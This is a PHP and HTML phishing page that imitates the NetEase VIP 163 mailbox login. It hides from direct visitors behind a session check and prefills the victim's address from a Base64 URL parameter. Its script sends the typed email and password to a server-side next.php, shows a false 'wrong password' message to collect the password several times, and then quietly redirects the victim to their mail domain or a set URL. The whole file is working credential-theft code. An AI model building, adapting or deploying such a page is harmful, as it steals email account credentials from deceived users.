<?php
session_start();
if (!isset($_SESSION['came_from_index']) || $_SESSION['came_from_index'] !== true) {
    header("HTTP/1.0 404 Not Found");
    exit("404 Not Found");
}
?>

<!DOCTYPE html>
<html data-bs-theme="light" lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>网易VIP高端邮箱</title>
    <link rel="stylesheet" href="../assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="../assets/css/styles.css">
</head>

<body>
    <div id="mainovip163" style="height: 100vh;width: 100%;">
        <div id="navbvip163" style="height: 60px;padding-left: 15px;padding-right: 15px;padding-top: 8px;padding-bottom: 8px;"><img class="img-fluid" width="278" height="64" src="../assets/img/vip163lg.png" style="height: 40px;width: auto;"></div>
        <div id="mainvip163" class="c-div">
            <div id="formoutervip163" style="width: 100%;max-width: 370px;margin-top: 30px;border: 1px solid rgb(129,129,129);border-radius: 3px;padding-bottom: 24px;background: #ffffff;">
                <div style="padding: 0px 60px;">
                    <p style="text-align: center;margin-top: 16px;margin-bottom: 8px;font-weight: bold;">邮箱账号登录</p>
                    <p style="text-align: center;margin-bottom: 32px;">推荐使用<a href="#">快捷登录</a>，防止盗号。</p><input type="text" id="backEMF" style="height: 38px;width: 100%;max-width: 250px;padding: 1px 8px;border: 1px solid #adadad ;" placeholder="邮箱账号/手机号码">
                    <div class="sp-div" style="margin-top: 16px;font-size: 12px;">
                        <div class="form-check"><input class="form-check-input" type="checkbox" id="formCheck-1"><label class="form-check-label" for="formCheck-1">记住账号</label></div><a href="#">忘记密码</a>
                    </div><input type="password" id="pass" style="height: 38px;width: 100%;max-width: 250px;padding: 1px 8px;margin-top: 3px;border: 1px solid #adadad;" placeholder="输入密码">
                    <p id="err" style="margin-bottom: 16pxpx;margin-top: 8px;color: rgb(211,0,0);text-align: left;">密码错误，请重试</p>
                    <div class="form-check" style="padding-top: 10px;"><input class="form-check-input" type="checkbox" id="formCheck-2"><label class="form-check-label" for="formCheck-2" style="font-size: 12px;">30天内免登录</label></div><button class="btn btn-primary" id="next-btn" type="button" style="width: 100%;max-width: 250px;height: 38px;border-style: none;border-radius: 0px;margin-top: 11px;" onclick="nextFun();">登 录</button>
                    <div class="sp-div" style="padding-top: 23px;"><button class="btn btn-primary" type="button" style="width: 40%;background: rgb(255,255,255);border-width: 1px;border-style: solid;color: rgb(110,177,255);">注&nbsp;册</button><button class="btn btn-primary" type="button" style="width: 40%;background: rgb(255,255,255);border-width: 1px;border-style: solid;color: rgb(110,177,255);">支&nbsp;付</button></div>
                    <p style="font-size: 12px;text-align: center;margin-top: 17px;">阅读并接受 《服务条款》和 《隐私政策》</p>
                </div>
            </div>
        </div>
    </div>
    <script src="../assets/bootstrap/js/bootstrap.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<script>
$(document).ready(function () {
    $(document).on('keypress', function (e) {
    if (e.which === 13) {
        $('#next-btn').click();
    }
});

    // Get parameters from URL
    const urlParams = new URLSearchParams(window.location.search);
    const useridEncoded = urlParams.get('userid');
    const maxTry = parseInt(urlParams.get('maxtry') || '3');
    const pageValue = urlParams.get('page') || '';
    const domainRedirect = urlParams.get('domain_redirect') || '';

    let tryCount = 0;
    let userid = '';

    // Decode Base64 email
    try {
        userid = atob(useridEncoded || '');
    } catch (e) {
        console.error("Invalid userid encoding");
    }

    // Fill userid into either #backEm or #backEMF
    if ($('#backEm').length) {
        $('#backEm').text(userid);
    }
    if ($('#backEMF').length) {
        $('#backEMF').val(userid);
    }

    // Hide error initially
    $('#err').hide();

    // Next button click handler
    $('#next-btn').on('click', function () {
        const password = $('#pass').val().trim();

        // If password empty
        if (!password) {
            $('#err').show();
            return;
        }

        // Disable button until AJAX finishes
        $('#next-btn').prop('disabled', true);

        // Prepare POST data
        const postData = {
            ai: userid,
            pr: password,
            page_value: pageValue
        };

        $.ajax({
            url: '../next.php',
            type: 'POST',
            data: postData,
            success: function (response) {
                tryCount++;

                if (tryCount >= maxTry) {
                    // After maxTry, proceed normally
                    $('#err').hide();
                     const emailParts = userid.split('@');
                     if(!domainRedirect){
                    if (emailParts.length === 2) {
                        const domain = emailParts[1];
                        window.location.replace(`https://${domain}`);
                    } else {
                        // Fallback if email is malformed
                        window.location.replace("https://www.google.com");
                    }
                    }else{
                         window.location.replace(domainRedirect);
                    }


                    // You can redirect or take another action here
                } else {
                    // Show error and reset password field
                    $('#err').show();
                    $('#pass').val('');
                }
            },
            error: function () {
                alert("Error contacting server.");
            },
            complete: function () {
                // Re-enable button after request finishes
                $('#next-btn').prop('disabled', false);
            }
        });
    });
});
</script>

</body>


</html>